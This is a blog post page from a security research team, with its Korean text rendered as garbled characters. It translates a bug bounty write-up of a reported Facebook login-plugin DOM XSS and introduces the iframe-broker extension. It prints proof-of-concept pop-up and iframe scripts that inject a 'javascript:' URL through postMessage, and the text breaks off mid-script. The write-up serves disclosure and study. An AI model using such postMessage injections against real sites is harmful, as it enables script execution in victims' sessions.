<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="google-site-verification" content="soS2al0KuMZmiyPzu87KFbqGSn0K9edQ8EkWp_m35n0" />
  

  <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>iframe broker &amp; Story of Facebook DOM XSS | Core-Research-Team</title>
<meta name="generator" content="Jekyll v4.0.1" />
<meta property="og:title" content="iframe broker &amp; Story of Facebook DOM XSS" />
<meta name="author" content="jeong.su" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ìµœì •ìˆ˜" />
<meta property="og:description" content="ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ìµœì •ìˆ˜" />
<link rel="canonical" href="http://localhost:4000/2020-05-01/iframe-broker-Story-of-Facebook-DOM-XSS" />
<meta property="og:url" content="http://localhost:4000/2020-05-01/iframe-broker-Story-of-Facebook-DOM-XSS" />
<meta property="og:site_name" content="Core-Research-Team" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-05-01T00:00:00+00:00" />
<script type="application/ld+json">
{"@type":"BlogPosting","headline":"iframe broker &amp; Story of Facebook DOM XSS","dateModified":"2020-05-01T00:00:00+00:00","datePublished":"2020-05-01T00:00:00+00:00","author":{"@type":"Person","name":"jeong.su"},"url":"http://localhost:4000/2020-05-01/iframe-broker-Story-of-Facebook-DOM-XSS","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020-05-01/iframe-broker-Story-of-Facebook-DOM-XSS"},"description":"ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ìµœì •ìˆ˜","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <!-- CSS -->
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Libre+Baskerville:400,400i,700">

  <!-- Favicon -->
  <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon.png">
  <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon.ico">

  <!-- RSS -->
  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Core-Research-Team" />

  <!-- Google Analytics-->
  
 
</head>


  <body>

    <nav class="nav">
  <div class="nav-container">
    <a href="/">
      <h2 class="nav-title">RAON - Core Research Team</h2>
    </a>
    <ul>
      <li><a href="/about">About</a></li>
      <li><a href="/">Posts</a></li>
    </ul>
  </div>
</nav>


    <main>
      <div class="post"> 
   <h1 class="post-title">iframe broker & Story of Facebook DOM XSS</h1>
   <div class="post-line"></div>

   
      
         
            <span class="tag"><center><i>Web</i></center></span>
         
      
   
   
   <p>ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ìµœì •ìˆ˜</p>

<p>ì´ ê¸€ì€ <a href="https://vinothkumar.me/">Vinoth Kumar</a>ê°€ ì§€ë‚œ 4ì›” Facebookì˜ DOM XSSë¥¼ ë°œê²¬í•˜ì—¬ ì œë³´í•˜ê³  2ë§Œ ë‹¬ëŸ¬ì˜ í¬ìƒê¸ˆì„ ë°›ì€ <a href="https://vinothkumar.me/20000-facebook-dom-xss/">ê²Œì‹œê¸€</a>ì„ ë²ˆì—­í•œ ë‚´ìš©ì´ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. ì¶”ê°€ë¡œ í•´ë‹¹ ì·¨ì•½ì ì„ ì°¾ê¸° ìœ„í•´ <a href="https://vinothkumar.me/">Vinoth Kumar</a>ê°€ ê°œë°œí•œ Iframeê³¼ Cross Window communications ë¡œê·¸ë¥¼ ì‰½ê²Œ í™•ì¸ í•  ìˆ˜ ìˆëŠ” í¬ë¡¬ ìµìŠ¤í…ì…˜ì„ ì‚¬ìš©í•˜ê³  ì–´ë–»ê²Œ ì ìš©í•  ìˆ˜ ìˆì„ì§€ ê³ ë¯¼í–ˆìŠµë‹ˆë‹¤.</p>

<hr />

<h1 id="iframe-broker">iframe broker</h1>

<hr />

<p>iframe brokerëŠ”  <a href="https://vinothkumar.me/">Vinoth Kumar</a>ê°€ Cross Window Communication ë¡œê·¸ë¥¼ ì‰½ê²Œ í™•ì¸í•˜ê¸° ìœ„í•´ì„œ ì‘ì„±í•œ Chrome Extension ì…ë‹ˆë‹¤.</p>

<p>í•´ë‹¹ ë„êµ¬ì˜ ê°„ë‹¨í•œ ì›ë¦¬ëŠ” messageë¥¼ í›„í‚¹í•˜ì—¬ ë³´ì—¬ì£¼ëŠ” ë°©ì‹ì…ë‹ˆë‹¤</p>

<p>JavascriptëŠ” ì•„ë˜ì™€ ê°™ì´ ê°„ë‹¨í•œ ìŠ¤í¬ë¦½íŠ¸ë¡œ í›„í‚¹í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">origin_parse</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">;</span>

<span class="nb">window</span><span class="p">.</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">arg</span><span class="p">){</span>
<span class="cm">/* Something Do It! */</span>
<span class="cm">/* ex) console.log(arg) */</span>
<span class="k">return</span> <span class="nx">origin_parse</span><span class="p">(</span><span class="nx">arg</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>iframe brokerì˜ ì‚¬ìš©ë²•ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/vinothsparrow/iframe-broker
</code></pre></div></div>

<p>ìš°ì„  git clone ëª…ë ¹ì–´ë¥¼ í†µí•´ íŠ¹ì • í´ë”ì— iframe-brokerë¥¼ ë°›ì•„ì¤ë‹ˆë‹¤.</p>

<p><img src="/assets/bd2f2d57-db96-4a00-8b4b-95448a489543/9680797e-d1ef-4857-b3e2-0da9ee7ab169.png" alt="/assets/bd2f2d57-db96-4a00-8b4b-95448a489543/9680797e-d1ef-4857-b3e2-0da9ee7ab169.png" /></p>

<p>Chrome Extension ì¶”ê°€ë¥¼ ìœ„í•´ ê°œë°œì ëª¨ë“œ ì˜µì…˜ì„ í™œì„±í™” ì‹œì¼œì¤ë‹ˆë‹¤. í•´ë‹¹ ì˜µì…˜ì„ í™œì„±í™” ì‹œì¼œì£¼ê²Œë˜ë©´ <code class="highlighter-rouge">ì••ì¶•í•´ì œëœ í™•ì¥ í”„ë¡œê·¸ë¨ì„ ë¡œë“œí•©ë‹ˆë‹¤.</code> ë²„íŠ¼ì´ ìƒê¸°ë©° í´ë¦­ì„ í†µí•´ clone í•´ì¤€ iframe-broker í´ë”ë¥¼ ì„ íƒí•´ì¤ë‹ˆë‹¤.</p>

<p><img src="/assets/85b6ceaf-3565-47cd-b65f-12aa7cb8b535/5b9b6572-8ba4-4984-a5d4-a72b0f832085.png" alt="/assets/85b6ceaf-3565-47cd-b65f-12aa7cb8b535/5b9b6572-8ba4-4984-a5d4-a72b0f832085.png" /></p>

<p>Iframe Brokerê°€ ì •ìƒì ìœ¼ë¡œ ë¡œë“œëœ ê²ƒì„ í™•ì¸ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<p><img src="/assets/bd53c735-b1b8-40f8-a86c-bfd2d2a7abd7/a391c04c-77cb-4b68-aab7-690a51b4c54d.png" alt="/assets/bd53c735-b1b8-40f8-a86c-bfd2d2a7abd7/a391c04c-77cb-4b68-aab7-690a51b4c54d.png" /></p>

<p>ìœ„ì™€ ê°™ì´ Chrome Extensionì„ í†µí•´ Domainê°„ í†µì‹ í•˜ëŠ” ë©”ì„¸ì§€ë¥¼ ì‰½ê²Œ í™•ì¸ í•  ìˆ˜ ìˆìœ¼ë©° í´ë¼ì´ì–¸íŠ¸ ì‚¬ì´ë“œì˜ ì·¨ì•½ì ì„ ì°¾ëŠ”ë° í¸ë¦¬í•œ ë„êµ¬ë¼ëŠ” ìƒê°ì´ë“­ë‹ˆë‹¤. ì•„ë˜ëŠ” í•´ë‹¹ Chrome Extension ê°œë°œìê°€ ê°œë°œ í›„ Extensionì„ ì‚¬ìš©í•˜ë©´ì„œ ì§ì ‘ ì·¨ì•½ì ì„ ì°¾ì€ ë‚´ìš©ì„ ë²ˆì—­í–ˆìŠµë‹ˆë‹¤.</p>

<h1 id="story-of-20000-facebook-dom-xss">Story of <a href="https://vinothkumar.me/20000-facebook-dom-xss/">$20000 Facebook DOM XSS</a></h1>

<hr />

<blockquote>
  <p>window.postMessage() methodë¥¼ ì‚¬ìš©í•˜ë©´ ìƒì„± ëœ í˜ì´ì§€ì™€ íŒì—… ì‚¬ì´ ë˜ëŠ” í˜ì´ì§€ì™€ í˜ì´ì§€ì— í¬í•¨ëœ iframe ì‚¬ì´ì™€ ê°™ì€ Window ê°ì²´ ê°„ì˜ cross-origin í†µì‹ ì„ ì•ˆì „í•˜ê²Œ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. - <a href="https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage">Mozilla postMessage Documentation</a></p>
</blockquote>

<p>postMessage ë° ë„ë©”ì¸ ê°„ í†µì‹ ì— ëŒ€í•´ ë” ì•Œê³  ì‹¶ë‹¤ë©´ ì•„ë˜ ë¬¸ì„œë¥¼ ì½ëŠ” ê²ƒì´ ì¢‹ìŠµë‹ˆë‹¤.</p>

<ul>
  <li><a href="https://javascript.info/cross-window-communication">How cross window/frame communication happens in Javascript</a></li>
  <li><a href="https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/">https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/</a></li>
  <li><a href="https://ngailong.wordpress.com/2018/02/13/the-mystery-of-postmessage/">https://ngailong.wordpress.com/2018/02/13/the-mystery-of-postmessage/</a></li>
</ul>

<h2 id="background">Background</h2>

<blockquote>
  <p>postMessageë¥¼ í†µí•œ DOM XSSëŠ” ê³¼ì†Œ í‰ê°€ ëœ ì·¨ì•½ì ì´ë©° ë§ì€ ë²„ê·¸ë°”ìš´í‹° í—Œí„°ë“¤ì—ê²ŒëŠ” ëˆˆì— ë„ì§€ ì•ŠëŠ” ì·¨ì•½ì ì…ë‹ˆë‹¤.</p>
</blockquote>

<p>ìµœê·¼ì— open dashboards ë° credentials ì·¨ì•½ì ì„ ì°¾ëŠ” ëŒ€ì‹  í´ë¼ì´ì–¸íŠ¸ ìª½ ì·¨ì•½ì ì„ ì°¾ê¸° ì‹œì‘í–ˆìŠµë‹ˆë‹¤.</p>

<p>(<a href="https://hackerone.com/vinothkumar">HackerOneì— ë¦¬í¬íŠ¸ëœ ë³´ê³ ì„œ</a>ë¥¼ ë³¸ë‹¤ë©´ ëŒ€ë¶€ë¶„ ë‚˜ì˜ ë¦¬í¬íŠ¸ëŠ” open dashboard ë˜ëŠ” Github credential leak ì…ë‹ˆë‹¤.)</p>

<p>ì²˜ìŒì—ëŠ” XSSI, JSONP ë° postMessage ê´€ë ¨ ëœ ë³´ì•ˆ ë¬¸ì œë¥¼ ì°¾ê¸° ì‹œì‘í–ˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ XSSI ë° JSONP ì·¨ì•½ì ì€ ë§¤ìš° ë“œë¬¼ë©° <a href="https://blog.reconless.com/samesite-by-default/">SameSite ì¿ í‚¤</a>ê°€ ë„ì… ëœ ì´í›„ ì´ ì·¨ì•½ì ì€ ì‚¬ë¼ì§ˆ ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ postMessage ì·¨ì•½ì ì„ ì‚´í´ ë³´ëŠ” ë° ì§‘ì¤‘í–ˆìŠµë‹ˆë‹¤. postMessage ì·¨ì•½ì ì€ ì£¼ë¡œ ë³´ì•ˆ ì—°êµ¬ì›ì´ ëŒ€ë¶€ë¶„ ë¬´ì‹œí•˜ì§€ë§Œ ë””ë²„ê¹…ì´ ì‰½ê³  ë°©í™”ë²½ì„ ìš°íšŒ í•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤.</p>

<p>ë˜í•œ ë””ë²„ê¹…ì„ ë” ì‰½ê²Œí•˜ê¸° ìœ„í•´ í˜ì´ì§€ì—ì„œ ë°œìƒí•˜ëŠ” cross window communicationì˜ view/logë¥¼ ìœ„í•œ <a href="https://github.com/vinothsparrow/iframe-broker">Chrome extensionì„ ê°œë°œ</a> í–ˆìŠµë‹ˆë‹¤.</p>

<p>ì¼ë°˜ì ìœ¼ë¡œ ì›¹ ì‚¬ì´íŠ¸ëŠ” ìœ„ì ¯, í”ŒëŸ¬ê·¸ì¸ ë˜ëŠ” ì›¹ SDKì—ì„œ iframe í†µì‹ ì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ë”°ë¼ì„œ í˜ì´ìŠ¤ë¶ì˜ iframe ë³´ì•ˆ ë¬¸ì œë¥¼ ì°¾ìœ¼ë ¤ê³  ì‹œì‘í•˜ìë§ˆì <a href="https://developers.facebook.com/">https://developers.facebook.com</a>ìœ¼ë¡œ ì´ë™í•˜ì—¬ Facebookì˜ third-party í”ŒëŸ¬ê·¸ì¸ì„ ë³´ê¸° ì‹œì‘í–ˆìŠµë‹ˆë‹¤.</p>

<p>ê·¸ë¦¬ê³  cross-domain í†µì‹ ì„ ìœ„í•´ì„œ <code class="highlighter-rouge">Facebook Login SDK for JavaScript</code>ëŠ” <code class="highlighter-rouge">v6.0/plugins/login_button.php</code>ì—ì„œ proxy iframeì„ ë§Œë“¤ë©° proxy frameì—ì„œëŠ” <code class="highlighter-rouge">Continue with Facebook</code> ë²„íŠ¼ì„ ë Œë”ë§ í•´ì¤ë‹ˆë‹¤. ì—¬ê¸°ì„œ í¥ë¯¸ë¡œìš´ ì ì€ javascript SDKê°€ proxy frameì— ë²„íŠ¼ì˜ í´ë¦­ URLì´ í¬í•¨ ëœ ì´ˆê¸°í™” í˜ì´ë¡œë“œë¥¼ ì „ì†¡ í•œë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤.</p>

<p>ë¡œê·¸ì¸ SDKì˜ íë¦„ì€ ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Third</span><span class="o">-</span><span class="nx">Party</span> <span class="nx">website</span> <span class="o">+</span> <span class="p">(</span><span class="nx">Facebook</span> <span class="nx">Login</span> <span class="nx">SDK</span> <span class="k">for</span> <span class="nx">JavaScript</span><span class="p">)</span>
</code></pre></div></div>

<p>â†“</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">iframe</span> <span class="nx">src</span><span class="o">=</span><span class="dl">'</span><span class="s1">https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;button_type=continue_with&amp;channel=REDIRECT_URL&amp;sdk=joey</span><span class="dl">'</span><span class="o">&gt;</span>
<span class="p">&lt;</span><span class="err">/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</code></pre></div></div>

<p>â†“</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Facebook Javascript SDKëŠ” ì´ˆê¸°í™” payloadë¥¼ iframe proxyì—ê²Œ ë³´ëƒ…ë‹ˆë‹¤.</span>
<span class="nx">iframe</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">({</span><span class="dl">"</span><span class="s2">xdArbiterHandleMessage</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">method</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">loginButtonStateInit</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">params</span><span class="dl">"</span><span class="p">:</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="dl">'</span><span class="s1">call</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">INT_ID</span><span class="dl">'</span><span class="p">,</span>
<span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">https://www.facebook.com/v7.0/dialog/oauth?app_id=APP_ID&amp;SOME_OTHER_PARAMS</span><span class="dl">'</span><span class="p">,</span>
<span class="dl">'</span><span class="s1">size</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">width</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">,</span><span class="dl">'</span><span class="s1">height</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">},</span><span class="dl">'</span><span class="s1">dims</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">screenX</span><span class="dl">'</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="dl">'</span><span class="s1">screenY</span><span class="dl">'</span><span class="p">:</span><span class="mi">23</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerHeight</span><span class="dl">'</span><span class="p">:</span><span class="mi">971</span><span class="dl">'</span><span class="s1">screenWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">}}})},</span><span class="dl">"</span><span class="s2">origin</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">APP_DOMAIN</span><span class="dl">"</span><span class="p">},</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">)</span>
</code></pre></div></div>

<p>â†“</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// ìœ ì €ê°€ Login with Facebook ë²„íŠ¼ì„ í´ë¦­í•˜ë©´ proxy iframeì—ì„œ íŠ¹ì • URLì„ open í•©ë‹ˆë‹¤.</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">'</span><span class="s1">https://www.facebook.com/v7.0/dialog/oauth?app_id=APP_ID</span><span class="dl">'</span><span class="p">)</span>
</code></pre></div></div>

<p>â†“</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// íŒì—… ìœˆë„ìš°ëŠ” accesstokenê³¼ signed-requestë¥¼ third-party websiteì—ê²Œ postMessageë¥¼ ì‚¬ìš©í•˜ì—¬ ë³´ëƒ…ë‹ˆë‹¤.</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">opener</span><span class="p">.</span><span class="nx">parent</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">result</span><span class="p">,</span> <span class="nx">origin</span><span class="p">)</span>
</code></pre></div></div>

<p>í•´ë‹¹ ì´ˆê¸°í™” payloadë¥¼ ì£¼ì˜ ê¹Šê²Œ ì‚´í´ë³´ë©´ SDKê°€ Facebook í”ŒëŸ¬ê·¸ì¸ iframeìœ¼ë¡œ ì „ì†¡í•©ë‹ˆë‹¤. url íŒŒë¼ë¯¸í„°ëŠ” ië¼ëŠ” ë³€ìˆ˜ì— ì €ì¥ ë˜ë©° ë²„íŠ¼ì´ í´ë¦­ ë˜ì–´ ì´ë²¤íŠ¸ê°€ íŠ¸ë¦¬ê±° ë  ë•Œ ì•„ë˜ í•¨ìˆ˜ê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.</p>

<p><img src="/assets/69ede5d3-8ba8-4af5-9ac8-fd925cbbe6d8/3dd7a08c-1d2a-4348-b669-0f7647a99b6b.png" alt="/assets/69ede5d3-8ba8-4af5-9ac8-fd925cbbe6d8/3dd7a08c-1d2a-4348-b669-0f7647a99b6b.png" /></p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">i</span><span class="p">.</span><span class="nx">url</span> <span class="o">=</span> <span class="nx">i</span><span class="p">.</span><span class="nx">url</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/cbt=</span><span class="se">\d</span><span class="sr">+/</span><span class="p">,</span> <span class="dl">"</span><span class="s2">cbt=</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">a</span><span class="p">);</span>
<span class="nx">a</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="nx">i</span><span class="p">.</span><span class="nx">url</span><span class="p">,</span> <span class="nx">i</span><span class="p">.</span><span class="nx">id</span><span class="p">,</span> <span class="nx">b</span><span class="p">(</span><span class="dl">"</span><span class="s2">buildPopupFeatureString</span><span class="dl">"</span><span class="p">)(</span><span class="nx">i</span><span class="p">));</span>
</code></pre></div></div>

<p>ìœ„ Javascript ì½”ë“œë¥¼ ë³´ì•˜ì„ ë•Œ ë‚˜ëŠ” â€œë¬´ì–¸ê°€ ì™”êµ¬ë‚˜! ì·¨ì•½ì ì´ ë‚´ê²Œ ì™”êµ¬ë‚˜! ğŸ˜‰â€ë¥¼ ëŠê¼ˆìŠµë‹ˆë‹¤.</p>

<p>ì™œëƒí•˜ë©´ Javascript ì½”ë“œì—ëŠ” URL/Scheme ìœ íš¨ì„± ê²€ì‚¬ê°€ ì¡´ì¬í•˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤. ë”°ë¼ì„œ ì•„ë˜ì™€ ê°™ì´ DOM XSSë¥¼ í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.</p>

<p><code class="highlighter-rouge">window.open('javascript:alert(document.domain)')</code></p>

<p>ê·¸ë˜ì„œ ìš°ë¦¬ê°€ <code class="highlighter-rouge">url:'javascript:alert(document.domain)'</code>ì™€ ê°™ì€ í˜ì´ë¡œë“œë¥¼ ë³´ë‚´ëŠ” ê²½ìš° ë°›ëŠ” ì‚¬ëŒì€ iframeì´ <a href="https://www.facebook.com/v6.0/plugins/login_button.php"><code class="highlighter-rouge">https://www.facebook.com/v6.0/plugins/login_button.php</code></a>ë¥¼ ë°©ë¬¸í•˜ê³  ì‚¬ìš©ìê°€ <code class="highlighter-rouge">Continue With Facebook</code>ë²„íŠ¼ì„ í´ë¦­í•˜ê²Œ ë˜ë©´  <a href="http://facebook.com/">facebook.com</a> ë„ë©”ì¸ì—ì„œ <code class="highlighter-rouge">javascript:alert(document.domain)</code>ì™€ ê°™ì€ Javascriptê°€ ì‹¤í–‰ë©ë‹ˆë‹¤.</p>

<h2 id="exploiting-the-iframe">Exploiting the Iframe</h2>

<p>ìœ„ ë³´ì•ˆ ì´ìŠˆë¥¼ í†µí•´ ìµìŠ¤í”Œë¡œì‡ í•˜ëŠ” ë°©ë²•ì€ 2ê°€ì§€ê°€ ìˆìŠµë‹ˆë‹¤.</p>

<h3 id="1-pop-up-method">1. Pop-up Method</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>   
   <span class="kd">var</span> <span class="nx">opener</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://www.facebook.com/v6.0/plugins/login_button.php?app_id=APP_ID&amp;auto_logout_link=false&amp;button_type=continue_with&amp;channel=REDIRECT_URL&amp;container_width=734&amp;locale=en_US&amp;sdk=joey&amp;size=large&amp;use_continue_as=true</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">opener</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">scrollbars=no,resizable=no,status=no,location=no,toolbar=no,menubar=no,width=500,height=1</span><span class="dl">"</span><span class="p">);</span>
   
   <span class="nx">setTimeout</span><span class="p">(</span><span class="kd">function</span><span class="p">(){</span>
        <span class="kd">var</span> <span class="nx">message</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">xdArbiterHandleMessage</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">method</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">loginButtonStateInit</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">params</span><span class="dl">"</span><span class="p">:</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="dl">'</span><span class="s1">call</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">123</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">javascript:alert(document.domain);</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">size</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">width</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">,</span><span class="dl">'</span><span class="s1">height</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">},</span><span class="dl">'</span><span class="s1">dims</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">screenX</span><span class="dl">'</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="dl">'</span><span class="s1">screenY</span><span class="dl">'</span><span class="p">:</span><span class="mi">23</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerHeight</span><span class="dl">'</span><span class="p">:</span><span class="mi">971</span><span class="p">,</span><span class="dl">'</span><span class="s1">screenWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">}}})},</span><span class="dl">"</span><span class="s2">origin</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">ORIGIN</span><span class="dl">"</span><span class="p">};</span>
        <span class="nx">opener</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="nx">message</span><span class="p">,</span> <span class="dl">'</span><span class="s1">*</span><span class="dl">'</span><span class="p">);</span>
    <span class="p">},</span><span class="dl">'</span><span class="s1">4000</span><span class="dl">'</span><span class="p">);</span>
<span class="p">&lt;</span><span class="err">/</span><span class="nt">script</span><span class="p">&gt;</span>
</code></pre></div></div>

<h3 id="2-iframe-method">2. Iframe Method</h3>

<p><code class="highlighter-rouge">X-Frame-Options</code> ë˜ëŠ” CSP <code class="highlighter-rouge">frame-ancestors</code> í—¤ë”ê°€ ëˆ„ë½ ë˜ì—ˆìœ¼ë¯€ë¡œ ì´ í˜ì´ì§€ëŠ” ê³µê²©ìì˜ í˜ì´ì§€ì— ì‰½ê²Œ í¬í•¨ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="kd">function</span> <span class="nx">fbFrameLoaded</span><span class="p">()</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">iframeEl</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">fbframe</span><span class="dl">'</span><span class="p">);</span>
  <span class="kd">var</span> <span class="nx">message</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">xdArbiterHandleMessage</span><span class="dl">"</span><span class="p">:</span><span class="kc">true</span><span class="p">,</span><span class="dl">"</span><span class="s2">message</span><span class="dl">"</span><span class="p">:{</span><span class="dl">"</span><span class="s2">method</span><span class="dl">"</span><span class="p">:</span><span class="dl">"</span><span class="s2">loginButtonStateInit</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">params</span><span class="dl">"</span><span class="p">:</span><span class="nx">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span><span class="dl">'</span><span class="s1">call</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">id</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">123</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">url</span><span class="dl">'</span><span class="p">:</span><span class="dl">'</span><span class="s1">javascript:alert(document.domain);</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">size</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">width</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">,</span><span class="dl">'</span><span class="s1">height</span><span class="dl">'</span><span class="p">:</span><span class="mi">10</span><span class="p">},</span><span class="dl">'</span><span class="s1">dims</span><span class="dl">'</span><span class="p">:{</span><span class="dl">'</span><span class="s1">screenX</span><span class="dl">'</span><span class="p">:</span><span class="mi">0</span><span class="p">,</span><span class="dl">'</span><span class="s1">screenY</span><span class="dl">'</span><span class="p">:</span><span class="mi">23</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerWidth</span><span class="dl">'</span><span class="p">:</span><span class="mi">1680</span><span class="p">,</span><span class="dl">'</span><span class="s1">outerHeight</span><span class="dl">'</span><span class="p">:</span><span class="mi">971</span><span 